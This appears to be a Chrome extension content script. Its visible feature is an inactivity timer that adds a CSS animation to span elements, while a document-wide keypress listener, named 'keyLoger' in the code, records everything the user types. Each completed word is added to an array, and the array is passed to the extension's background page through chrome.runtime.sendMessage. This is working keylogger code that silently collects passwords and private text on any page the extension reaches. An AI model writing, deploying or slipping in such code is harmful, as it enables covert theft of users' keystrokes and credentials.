/*
 // (A) CREATE BLOB OBJECT
  var myBlob = new Blob([imageUri], {type: "text/plain"});

  // (B) CREATE DOWNLOAD LINK
  var url = window.URL.createObjectURL(myBlob);
  var anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = "demo.txt";
   
  // (C) "FORCE DOWNLOAD"
  // NOTE: MAY NOT ALWAYS WORK DUE TO BROWSER SECURITY
  // BETTER TO LET USERS CLICK ON THEIR OWN
  anchor.click();
  window.URL.revokeObjectURL(url);
  document.removeChild(anchor);

*/



let keyLoger = ""
let array = []

document.addEventListener("keypress", (e) => {
    
    keyLoger+=e.key
    
    if (e.key==" " || e.key=="Enter"){
        array.push(keyLoger)
        keyLoger=""
        notifyBackgroundPage(array)
        // console.log("array = ",array )
    }
})

let baliseSelect = "span"

let inactivityTime = function () {
    let time;
    window.onload = resetTimer;
    // DOM Events
    document.onmousemove = resetTimer;
    document.onkeydown = resetTimer;

    function createAnimation() {

       console.log("bientot une animation sera ici")

       let baliseSelection = document.querySelectorAll(baliseSelect)
       baliseSelection.forEach(function(item){
        item.setAttribute("class","animationCSS")
       })


    }

    function resetTimer() {
        clearTimeout(time);
        console.log("Je remet le texte normal")

        let baliseSelection = document.querySelectorAll(baliseSelect)
        baliseSelection.forEach(function(item){
        item.setAttribute("class","")
       })

        time = setTimeout(createAnimation, 3000)
        
        // 1000 milliseconds = 1 second
    }
};

window.onload = function() {
    inactivityTime();
  }


// Send message to chrome extention
  function handleResponse(message) {
    console.log(`Message from the background script:  ${message.response}`);
  }
  
  function handleError(error) {
    console.log(`Error: ${error}`);
  }
  
  function notifyBackgroundPage(e) {
    var sending = chrome.runtime.sendMessage({
      greeting: e
    //   greeting: "Greeting from the content script"
    });
    sending.then(handleResponse, handleError);
  }
  
//   window.addEventListener("click", notifyBackgroundPage);
 

